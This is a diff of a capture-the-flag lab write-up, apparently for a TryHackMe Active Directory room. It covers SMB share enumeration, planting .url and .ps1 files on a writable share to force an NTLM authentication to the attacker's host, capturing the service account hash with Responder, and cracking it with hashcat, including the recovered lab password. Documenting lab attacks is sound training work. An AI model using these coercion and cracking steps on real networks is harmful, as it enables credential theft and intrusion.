@@ -14,36 +14,41 @@ Before starting, DNS resolution must point to the Domain Controller. this is cri
 <img width="1207" height="807" alt="Pasted image 20260827163857" src="https://github.com/user-attachments/assets/20531676-48fa-4bf6-9772-25fe986577d3" />
 
 	
-## 3. SMB Shares Enumeration:
-	 i tried smbmap, nmap's smb_enum_shares, enum4linux-ng -> nothing worked
-	then i used smbclient and it worked: 
+3. ## SMB Shares Enumeration:
+	 - i tried smbmap, nmap's smb_enum_shares, enum4linux-ng -> nothing worked
+		then i used smbclient and it worked: 
 		`smbclient -L //10.114.142.161/ -N`
-		![[Pasted image 20260827164709.png]] 
-	- then i had to connect to each share -> and discovered that i had read/write access to IT-Shared along with some interesting information:
-		`smbclient //10.114.142.161/IT-Shared -N`
-		![[Pasted image 20260827165154.png]]
-		
-now since i have write access, and the file share hints that svc.scanner service account enumerates IT-Shared share for new files to process, that indicates a possible  "File-Based Coercion Attack".
+		<img width="887" height="281" alt="Pasted image 20260827164709" src="https://github.com/user-attachments/assets/1dd75d6a-fdbb-4780-9168-18b79dabe550" />
 
-1. i spin up a listener using responder
+	 - then i had to connect to each share -> and discovered that i had read/write access to IT-Shared along with some interesting information:
+		`smbclient //10.114.142.161/IT-Shared -N`
+		<img width="737" height="430" alt="Pasted image 20260827165154" src="https://github.com/user-attachments/assets/b0a38d0a-3d53-4385-b3a7-574855b035ef" />
+
+		
+now since i have write access, and the file share hints that svc.scanner service account enumerates IT-Shared share for new files to process, that indicates a possible "File-Based Coercion Attack".
+
+# Exploitation    "File-Based Coercion Attack"
+1. I spin up a listener using responder
 	`sudo responder -I tun0`  
 
-2. i tried to upload  @test.url file with this syntax, but it didn't work
+2. I tried to upload  @test.url file with this syntax:
 	[InternetShortcut]
 	URL=http://thm.loc
 	WorkingDirectory=thm
 	IconFile=\\YOURTUN0IP\icons\icon.ico      
 	IconIndex=1
+but it didn't trigger authentication
 
-3. i tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
+3. I tried another file type @test.ps1 with this syntax:   ~~the @ is to make the file at the top~~
 	`Test-Path \\192.168.157.253\icons\icon.ico`
-	and in just seconds i intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
-	![[Pasted image 20260827171310.png]]
+	and in just seconds I intercepted and received an SMB authentication request from svc.scanner account containing his NTLMv2 hash.
+   <img width="945" height="277" alt="Pasted image 20260827171310" src="https://github.com/user-attachments/assets/86e241db-a377-46ec-b3cb-e3db8eb7dc64" />
 
-Cracking the captured NTLMv2 hash:
-	1. i saved the hash to hash.txt file
-	2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force` 
-	the password is: 1summerlove!
+
+## Cracking the captured NTLMv2 hash:
+1. i saved the hash to hash.txt file
+2. `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force` 
+the password is: 1summerlove!
 
 
 [[Kerberoasting]]
